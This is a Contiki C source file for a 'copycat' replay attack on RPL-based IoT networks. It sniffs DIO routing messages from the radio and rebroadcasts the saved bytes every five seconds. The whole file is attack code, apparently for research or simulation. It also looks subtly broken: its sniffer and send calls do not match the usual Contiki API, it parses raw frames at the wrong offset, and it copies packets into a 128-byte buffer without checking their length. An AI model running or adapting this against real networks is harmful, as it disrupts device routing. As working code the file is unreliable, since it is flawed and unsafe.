#include "contiki.h"
#include "net/netstack.h"
#include "net/packetbuf.h"
#include "net/linkaddr.h"
#include "net/mac/mac.h"
#include "sys/log.h"
#include "sys/etimer.h"

#define LOG_MODULE "COPYCAT"
#define LOG_LEVEL LOG_LEVEL_INFO

#define REPLAY_INTERVAL (5 * CLOCK_SECOND)

static uint8_t saved_dio[128];
static uint16_t saved_dio_len = 0;

PROCESS(copycat_attack_process, "Copycat attacker");
AUTOSTART_PROCESSES(&copycat_attack_process);

/*---------------------------------------------------------------------------*/
/* Sniffer callback: captures every packet overheard */
static void
copycat_sniffer(const struct mac_driver *drv, const uint8_t *data, uint16_t len)
{
  /* RPL DIO recognition:
     ICMPv6 Type = 155 (0x9B)
     ICMPv6 Code = 0x01  → RPL DIO
  */
  if(len > 4 && data[0] == 0x9B && data[1] == 0x01) {
    LOG_INFO("Sniffed RPL DIO (len=%u)\n", len);
    memcpy(saved_dio, data, len);
    saved_dio_len = len;
  }
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(copycat_attack_process, ev, data)
{
  static struct etimer periodic;
  PROCESS_BEGIN();

  LOG_INFO("Copycat attacker started\n");

  /* Register sniffer */
  NETSTACK_MAC.sniffer_add(copycat_sniffer);

  etimer_set(&periodic, REPLAY_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic));

    if(saved_dio_len > 0) {
      LOG_WARN("Replaying DIO (len=%u)\n", saved_dio_len);

      /* Replay raw bytes over radio */
      NETSTACK_MAC.send(NULL, saved_dio, saved_dio_len);

      /* Optional: randomize timing */
    }

    etimer_reset(&periodic);
  }

  PROCESS_END();
}